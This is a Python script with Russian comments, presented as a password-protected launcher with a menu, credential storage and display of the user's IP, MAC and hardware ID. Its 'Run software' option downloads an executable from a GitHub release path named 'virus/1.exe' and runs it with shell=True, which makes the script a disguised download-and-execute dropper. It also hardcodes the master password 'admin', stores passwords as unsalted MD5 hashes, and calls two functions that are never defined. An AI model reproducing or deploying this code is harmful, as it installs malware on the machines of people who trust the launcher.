import socket
import uuid
import hashlib
import configparser
import platform
import urllib.request
import tempfile
import os
import subprocess
import time

# Функция для получения идентификатора оборудования
def get_hwid():
    hwid = hashlib.md5(platform.processor().encode('utf-8')).hexdigest()
    hwid += hashlib.md5(platform.node().encode('utf-8')).hexdigest()
    hwid += hashlib.md5(platform.system().encode('utf-8')).hexdigest()
    hwid += hashlib.md5(platform.version().encode('utf-8')).hexdigest()
    return hwid

# Функция для шифрования пароля
def encrypt_password(password):
    return hashlib.md5(password.encode('utf-8')).hexdigest()

# Функция для сохранения учетных данных в config.ini
def save_credentials(login, password):
    config = configparser.ConfigParser()
    config['Credentials'] = {
        'Login': login,
        'Password': encrypt_password(password)
    }
    with open('config.ini', 'w') as config_file:
        config.write(config_file)

# Функция для загрузки учетных данных из config.ini
def load_credentials():
    config = configparser.ConfigParser()
    config.read('config.ini')
    if 'Credentials' in config:
        return config['Credentials']['Login'], config['Credentials']['Password']
    else:
        return None, None

# Функция для аутентификации основного пароля
def authenticate_main_password():
    # Получаем основной пароль от пользователя
    main_password = input("\033[92m" + "Введите главный пароль: " + "\033[0m")

    # Сравниваем введенный пароль с сохраненным основным паролем
    saved_main_password = "admin"  # Замените на ваш фактический основной пароль
    if encrypt_password(main_password) == encrypt_password(saved_main_password):
        print("\033[92m" + "Доступ разрешен. Авторизация успешна!" + "\033[0m")
        return True
    else:
        print("\033[91m" + "Неверный главный пароль. Доступ запрещен." + "\033[0m")
        return False

# Функция для отображения главного меню
def main_menu():
    print("\nГлавное меню:")
    print("1. Запустить software")
    print("2. Сменить пароль")
    print("3. Сменить пользователя")
    print("0. Выйти")

# Функция для запуска программы
def run_software():
    print("Запуск программы...")

    # URL для загрузки файла
    file_url = "https://github.com/kromskii2/Krimare/releases/download/virus/1.exe"  # Замените на фактический URL

    # Создаем временный файл для сохранения загруженного содержимого
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        try:
            # Загружаем файл и сохраняем его во временный файл
            urllib.request.urlretrieve(file_url, temp_file.name)
            print(f"Файл успешно скачан: {temp_file.name}")

            # Вводим задержку в 3 секунды
            print("Ждем 3 секунды перед запуском файла...")
            time.sleep(3)

            # Запускаем загруженный файл с использованием subprocess
            subprocess.run([temp_file.name], shell=True)

            # Ждем, пока процесс не завершится
            print("Ждем завершения процесса...")
            time.sleep(3)  # Подождите несколько секунд (возможно, потребуется регулировка)

        except Exception as e:
            print(f"Ошибка при скачивании или запуске файла: {e}")

        finally:
            try:
                # Очищаем: Удаляем временный файл
                os.remove(temp_file.name)
                print("Временный файл удален.")
            except PermissionError:
                print("Не удалось удалить временный файл. Возможно, он используется другим процессом.")

# Основная функция
def main():
    saved_login, saved_password = load_credentials()

    if saved_login and saved_password:
        print("\033[92m" + f"Обнаружены сохраненные учетные данные: Логин: {saved_login}" + "\033[0m")
        while not authenticate_main_password():
            pass  # Повторяем, пока не будет введен правильный основной пароль

        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
        hwid = get_hwid()

        print("\033[92m" + f"IP адрес пользователя: {ip_address}" + "\033[0m")
        print("\033[92m" + f"MAC адрес пользователя: {mac_address}" + "\033[0m")
        print("\033[92m" + f"HWID пользователя: {hwid}" + "\033[0m")
    else:
        login = input("\033[92m" + "Введите login: " + "\033[0m")
        password = input("\033[92m" + "Введите password: " + "\033[0m")
        save_credentials(login, password)
        print("\033[92m" + "Авторизация успешна!" + "\033[0m")

        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
        hwid = get_hwid()

        print("\033[92m" + f"IP адрес пользователя: {ip_address}" + "\033[0m")
        print("\033[92m" + f"MAC адрес пользователя: {mac_address}" + "\033[0m")
        print("\033[92m" + f"HWID пользователя: {hwid}" + "\033[0m")

    while True:
        main_menu()
        choice = input("Выберите опцию (введите номер): ")

        if choice == '1':
            run_software()
        elif choice == '2':
            change_password(saved_login)
        elif choice == '3':
            change_user()
        elif choice == '0':
            # Сохраняем учетные данные перед выходом
            save_credentials(saved_login, saved_password)
            print("Сохранение учетных данных перед выходом.")
            print("Выход из программы.")
            break
        else:
            print("Неверный выбор. Пожалуйста, выберите существующую опцию.")

if __name__ == "__main__":
    main()
